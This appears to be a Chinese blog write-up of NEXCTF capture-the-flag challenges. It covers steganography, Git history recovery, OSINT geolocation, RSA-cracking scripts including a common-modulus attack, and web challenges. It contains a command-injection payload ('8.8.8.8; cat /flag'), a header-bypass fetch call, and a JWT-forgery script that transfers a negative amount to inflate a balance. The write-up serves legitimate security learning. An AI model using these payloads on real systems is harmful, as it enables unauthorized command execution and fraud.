---
title: NEXCTF部分赛题复盘
published: 2025-10-20
description: '对NEXCTF比赛中部分赛题的详细解析与复盘总结'
image: ''
tags: [NEXCTF, code]
category: 'Coding'
draft: false 
lang: 'zh-CN'
---




### **NEXCTF 赛题解析与复盘**

#### **1. 签到题：初见端倪**

此题作为热身，解法直截了当。Flag被嵌入在文件的元数据中，通过检视文件的属性详细信息即可发现。

#### **2. 兽言兽语：异星密码学**

本题的线索指向一种名为“兽言兽语”的自定义编码。利用在线转换工具，将密文还原后得到一个网盘地址。该地址指向的资源是一张图片，但其文件头表明它实际上是一个RAR压缩档案。通过修正文件后缀名并进行解压，即可获得最终的Flag。

#### **3. 奇思妙想聪明的小羊：Git的时间漫游**

此挑战呈现为一个伪装成RAR压缩包的Git版本控制仓库。分析其内部文件结构后，可以发现`.git`目录，并进一步检查提交历史。`COMMIT`文件的日志揭示了关键操作：“Remove Flag”，这表明Flag曾被提交后又遭删除。通过编写脚本追溯并还原Git的操作记录，可以重现版本变更前的状态。目标Flag被封存在ID为`c93c527f9a5fff8040ea4c8882d7583e10749ddf`的commit对象中，解析此哈希值指向的内容即可揭示秘密。

#### **4. 来自中世纪的宝藏：多重隐写术**

此题是一个多层嵌套的隐写挑战。首先，在给定的Word文档中，通过全选文本并统一修改字体颜色，可以发现被隐藏的解密密钥。随后，将文档后缀名更改为`.rar`并解压，暴露出其内部文件结构，其中包含一张被隐藏的图片。利用`steghide`工具，以上一步获得的密钥来提取图片中隐藏的数据，得到一串Base64编码的字符串。经过Base64解码和随后的ROT13位移密码转换，最终还原出正确的Flag。

#### **5. ctf怎么能少得了图寻呢**

这是一个分为两部分的地理定位挑战（OSINT）。

1.  **又见猎户座**：利用星空分析工具（如`https://bengbuguards.github.io/StarLocator/`）对图片进行分析，可以确定星座为猎户座，拍摄日期大约在12月14日。根据星体位置反推出拍摄地点的纬度约为北纬32度。结合第二张图的城市景观（地形平坦、经济繁荣），推断出这是一个沿海发达城市。在北纬32度附近进行地理排查，最终锁定目标城市为宁波。

2.  **经典飞机照**：基于第一题的结论，假设这是一趟从宁波飞往沈阳的航班。通过航路规划网站（如Simbrief）查询该航线，发现大部分航程在海上，仅有一小段经过陆地。沿着这段陆上航线，在卫星地图上进行比对，可以识别出图片中标志性的环形地标是上海的滴水湖。

#### **6. Pyyyyyyyyyyyyyyyyyyyython：代码迷宫**

此题提供了一段复杂的Python代码。解决方案是将其在集成开发环境（IDE）如PyCharm中执行，通过调试和运行，让代码逻辑自然走到终点，从而输出Flag。

#### **7. 保护超级地球：密码学的攻防战**

这是一个分为三部分的密码学系列挑战。

1.  **来自英仙座的怪兽 (第一部分)**：一个基础的数学问题。题目给出了一个大数，它是原始密码的5次方。通过对其进行开5次方根运算，即可得到原始密码。

2.  **来自英仙座的怪兽 (第二部分)**：一个简化的RSA加密问题，其核心在于在已知大素数`p`的情况下求解。解密的关键是计算私钥`d`。由于模数是素数`p`，欧拉函数`φ(p)`的计算简化为`p - 1`。随后，通过计算公钥`e`关于`φ(p)`的模逆元即可获得`d`。最终，通过公式 `m = c^d mod p` 解出明文。
    ```python
    def crack_rsa_password():
        # 给定的大素数p
        p = 159338638036825583034451971187355002308479829829881497413239527748436936133038906684521225569411512469943216402082547374388219396981684517042610419708801760299404363479526922909103509445042909622268513612272400652236252301273504560541054904989249711528241657374359612341793425094720607241727768557796171601457

        # 加密结果c
        c = 134607764658196959396093424455659177229118074205402661224653447585839278937030548118594369016812352265467459580345146349163076908967098242410566308099967564342387918280148766936917289194194484009772390076811558901153240498471347872024960981669901121397753541107045703190542736798219740398641842260929770232482

        # 公钥指数e（标准RSA常用值）
        e = 65537

        print("开始破解密码...")
        print(f"素数p长度: {len(str(p))} 位")
        print(f"加密结果c长度: {len(str(c))} 位")
        print(f"公钥指数e: {e}")

        # 计算欧拉函数φ(p) = p - 1（因为p是素数）
        phi_p = p - 1
        print(f"\n计算φ(p) = p - 1...")

        # 计算私钥d，满足 e * d ≡ 1 (mod φ(p))
        # 使用扩展欧几里得算法或Python内置的pow函数
        print("计算私钥d...")
        d = pow(e, -1, phi_p)
        print(f"私钥d计算完成（前20位）: {str(d)[:20]}...")

        # 解密：计算 m = c^d mod p
        print("\n开始解密...")
        password = pow(c, d, p)
        print(f"解密完成！")

        # 尝试将数字转换为可读格式
        print("\n=== 破解结果 ===")
        print(f"数字形式的密码: {password}")

        # 尝试将数字转换为文本（假设是ASCII编码）
        try:
            # 转换为十六进制
            hex_password = hex(password)[2:]
            # 确保十六进制字符串长度为偶数
            if len(hex_password) % 2 != 0:
                hex_password = '0' + hex_password
            # 转换为字节
            bytes_password = bytes.fromhex(hex_password)
            # 尝试解码为字符串
            text_password = bytes_password.decode('utf-8', errors='ignore')
            if text_password.isprintable() and text_password:
                print(f"文本形式的密码: {text_password}")
        except:
            print("无法转换为文本格式，密码可能就是数字本身")

        # 验证解密结果
        print("\n验证解密结果...")
        verify = pow(password, e, p)
        if verify == c:
            print("✓ 验证成功！解密结果正确。")
        else:
            print("✗ 验证失败！解密结果可能有误。")

        return password


    # 执行破解
    if __name__ == "__main__":
        result = crack_rsa_password()
        print(f"\n最终密码: {result}")
    ```

3.  **怪兽的最后反攻 (第三部分)**：这是一个标准的RSA挑战，但由于提供了其中一个素数因子`p`，难度大为降低。另一个素数因子`q`可通过`q = n // p`计算得出。有了`p`和`q`，便可计算出欧拉函数`φ(n) = (p - 1) * (q - 1)`，进而求出私钥`d`。最终，通过 `m = c^d mod n` 解密出原始信息。
    ```python
    def crack_rsa_with_two_primes():
        # 给定的参数
        n = 88111285618281188800567378681709695070557835555801763927147007279053269804905029551460530045020013484939011798711578751601525617747572785106366821940916557120546462816901867976706248727616065156709234120760061933770985142022659836107898138023869608920378216729662087387588212234579240554522894517480496156219

        p = 10654941500103878218268638691806740649404619000789974929656366124581441136190165656532436756833467360332923310352328532863640261099117929106235877338134889

        c = 72958017365770814638036797794134955078256558724424697482181677881252308395652345915572436415041602572445828890833562918062044382497944805006155421545913565194062008295329467273304489808333325205742705233475212012394471634052980130936526834515660861135653044353872548564640363065662827538988538301737919144977

        e = 65537  # 标准RSA公钥指数

        print("开始破解RSA密码...")
        print(f"n的长度: {len(str(n))} 位")
        print(f"已知素数p的长度: {len(str(p))} 位")
        print(f"公钥指数e: {e}")

        # 步骤1: 计算另一个素数q
        print("\n步骤1: 计算另一个素数q = n / p")
        q = n // p
        print(f"q = {q}")

        # 验证p * q = n
        if p * q == n:
            print("✓ 验证成功: p * q = n")
        else:
            print("✗ 验证失败: p * q ≠ n")
            return None

        # 步骤2: 计算欧拉函数φ(n)
        print("\n步骤2: 计算欧拉函数φ(n) = (p-1) * (q-1)")
        phi_n = (p - 1) * (q - 1)
        print(f"φ(n)计算完成")

        # 步骤3: 计算私钥d
        print("\n步骤3: 计算私钥d，满足 e * d ≡ 1 (mod φ(n))")
        d = pow(e, -1, phi_n)
        print(f"私钥d计算完成（前20位）: {str(d)[:20]}...")

        # 步骤4: 解密
        print("\n步骤4: 解密密码 = c^d mod n")
        password = pow(c, d, n)
        print(f"解密完成！")

        # 显示结果
        print("\n" + "=" * 50)
        print("=== 破解结果 ===")
        print("=" * 50)
        print(f"数字形式的密码: {password}")

        # 尝试将数字转换为文本
        try:
            # 转换为十六进制
            hex_password = hex(password)[2:]
            if len(hex_password) % 2 != 0:
                hex_password = '0' + hex_password

            # 转换为字节并解码
            bytes_password = bytes.fromhex(hex_password)
            text_password = bytes_password.decode('utf-8', errors='ignore')

            if text_password.isprintable() and text_password:
                print(f"文本形式的密码: {text_password}")
        except:
            print("密码是纯数字形式")

        # 验证解密结果
        print("\n验证解密结果...")
        verify = pow(password, e, n)
        if verify == c:
            print("✓ 验证成功！解密结果正确。")
            print("\n外星怪兽的防御被成功破解！")
            print("提示：泄露其中一个素数p是致命的错误，因为可以轻松计算出q = n/p")
        else:
            print("✗ 验证失败！")

        return password


    # 执行破解
    if __name__ == "__main__":
        result = crack_rsa_with_two_primes()
        print(f"\n最终密码: {result}")
    ```

4.  **怪兽的最后反攻 (最终部分)**: 此题为RSA共模攻击的典型应用。同一明文`m`被相同的模数`n`和两个不同的公钥指数`e1`、`e2`加密。若`e1`和`e2`互质，可通过扩展欧几里得算法找到系数`s`和`t`，满足`s*e1 + t*e2 = 1`。明文`m`即可通过 `m = (c1^s * c2^t) mod n` 计算得出。
    ```python
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-

    def extended_gcd(a, b):
        """扩展欧几里得算法，返回gcd(a,b)以及系数x,y使得ax + by = gcd(a,b)"""
        if b == 0:
            return a, 1, 0
        else:
            gcd, x1, y1 = extended_gcd(b, a % b)
            x = y1
            y = x1 - (a // b) * y1
            return gcd, x, y


    def mod_inverse(a, m):
        """计算a在模m下的逆元"""
        gcd, x, _ = extended_gcd(a, m)
        if gcd != 1:
            raise Exception('模逆元不存在')
        return (x % m + m) % m


    def common_modulus_attack(n, e1, e2, c1, c2):
        """
        RSA共模攻击
        当同一消息m用相同模数n但不同指数e1、e2加密时：
        c1 = m^e1 mod n
        c2 = m^e2 mod n

        如果gcd(e1, e2) = 1，可以通过扩展欧几里得算法找到s和t
        使得 s*e1 + t*e2 = 1
        那么 m = (c1^s * c2^t) mod n
        """
        # 使用扩展欧几里得算法
        gcd, s, t = extended_gcd(e1, e2)

        print(f"gcd(e1, e2) = {gcd}")
        print(f"找到系数: {s}*{e1} + {t}*{e2} = {gcd}")

        if gcd != 1:
            raise Exception("e1和e2不互质，无法使用此方法！")

        # 计算 m = (c1^s * c2^t) mod n
        # 注意：如果s或t是负数，需要使用模逆元

        if s < 0:
            # c1^s = (c1^(-1))^|s|
            c1 = mod_inverse(c1, n)
            s = -s

        if t < 0:
            # c2^t = (c2^(-1))^|t|
            c2 = mod_inverse(c2, n)
            t = -t

        # 计算结果
        m = (pow(c1, s, n) * pow(c2, t, n)) % n

        return m


    # 题目给定的参数
    n = 136397035084401288743081144812293215255520019556848382003825058734775831352149674405142753618183689157049774279117742260579239879247205114436694751502823871758786614523070746743315452728247357975638898766979834902191608775893974887732288653684791063313251087622202666297677482644383952205939097706656775067523
    e1 = 65537
    e2 = 114514
    c1 = 121252670694842574722522642599283078998112381334089098748977650013180437774770152295946630499106935755786560948777457155606729108459862537611520409473061563946247769491017580761674217154293565799438719285253473127527393835775236480806972564771774395876673116277841718220070792089502387697282438246661597392161
    c2 = 8526998841671502412439491429984928417486349337252616407579263589937765011496847416484723257600986433827205174828043015761150967749089973974722428455802340805454961426425258608778707064088307600772313086663773885622160642452338851413409624816591341517475833620289355364657346550762977461497973388252307537763

    print("=" * 70)
    print("开始破解RSA共模攻击...")
    print("=" * 70)

    # 执行共模攻击
    m = common_modulus_attack(n, e1, e2, c1, c2)

    print(f"\n解密得到的数字: {m}")

    # 尝试将数字转换为字符串
    try:
        # 将整数转换为字节
        message_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder='big')
        # 尝试解码为UTF-8
        message = message_bytes.decode('utf-8', errors='ignore')
        print(f"解密得到的密码: {message}")
    except:
        # 如果无法解码，尝试其他方法
        try:
            message = bytes.fromhex(hex(m)[2:]).decode('utf-8', errors='ignore')
            print(f"解密得到的密码: {message}")
        except:
            print(f"无法直接转换为文本，原始数字: {m}")

    print("=" * 70)
    print("破解完成！")
    print("=" * 70)
    ```

#### **8. 签到（web）：前端的蛛丝马迹**

此题需要多步前端侦察。首先，通过在URL后添加 `/flag2.txt` 路径访问，可以获得初步提示。随后，使用浏览器开发者工具（F12）检查应用的Cookie，发现了进一步的线索。最终的Flag片段隐藏在网络请求的响应头中，需将其与之前获得的信息拼接，构成完整答案。

#### **9. 校园福利中心：API的权限游戏**

本题的突破口在于分析前端JavaScript代码，发现了一个目标API端点 `/api/flag`。直接访问该接口会被拒绝。然而，代码逻辑显示，若请求头中包含一个自定义字段 `X-Can-View: yes`，服务器便会返回Flag。通过在浏览器控制台中执行`fetch`请求，并附带此特殊头部，即可在返回的JSON数据中获取Flag。
```javascript
fetch("/api/flag", {
    headers: {"X-Can-View": "yes"}
}).then(r => r.json()).then(console.log)
```

#### **10. 简易签名的VIP计划：JWT的逻辑缺陷**

此题利用了应用JWT实现中的一个逻辑漏洞。前端代码中暴露的JWT生成逻辑存在缺陷，允许攻击者伪造token。通过构造一个转账给自己负数金额（从而等效于增加余额）的payload，并用此payload生成伪造的JWT，然后向 `/api/transfer` 端点发起请求。当账户余额达到特定阈值后，系统奖励机制被触发，返回Flag。
```javascript
async function exploit() {
    const transferPayload = {
        username: currentUser,
        to: currentUser,
        amount: -100000000000,
        iat: Math.floor(Date.now() / 1000),
        action: 'transfer'
    };
    const exploitToken = await generateJWT(transferPayload);

    const response = await fetch('/api/transfer', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${exploitToken}`
        },
        body: JSON.stringify({
            from: currentUser,
            to: currentUser,
            amount: -100000000000
        })
    });

    const data = await response.json();
    console.log(data);
    if (data.success) {
        console.log('攻击成功！新的余额：', data.newBalance);
        // 然后检查奖励
        checkForReward();
    } else {
        console.log('攻击失败：', data.message);
    }
}

exploit();
```

#### **11. 神秘黑客的挑衅：网络侦察与注入**

1.  **公开的秘密**：一个DNS侦察任务。Flag被隐藏在题目所提供域名的`TXT`记录中，通过`dig`或`nslookup`等工具查询即可获得。

2.  **扭曲的镜像**：一个经典的命令注入漏洞。应用的诊断功能未能有效净化用户输入，允许通过`;`等字符进行命令拼接。构造 `8.8.8.8; cat /flag` 这样的payload，即可在服务器上执行任意命令并读取Flag文件。

#### **12. 逆流：数据迷踪**

1.  **第一次接触：咖啡店的暗号**：此题提供了一个Python的pickle序列化文件 (`.pkl`)。直接加载会因缺少原始类定义而报错。通过在加载脚本中定义一个同名的空类，可以绕过此限制并成功反序列化对象。然而，直接打印对象仅显示内存地址。解题的关键在于打印对象的 `__dict__` 属性，它会以字典形式揭示对象内部存储的所有数据。Flag以一种视觉化的方式隐藏在这些数据中，需要仔细观察其结构和内容才能发现。
    ```python
    import pickle
    import pandas as pd

    # 文件名是 contact.pkl
    file_path = 'contact.pkl'

    # 使用 'rb' 模式（读取二进制文件）打开文件
    # 然后使用 pickle.load() 来反序列化对象
    with open(file_path, 'rb') as f:
        data = pickle.load(f)

    # 直接打印这个加载出来的对象
    print(data)
    ```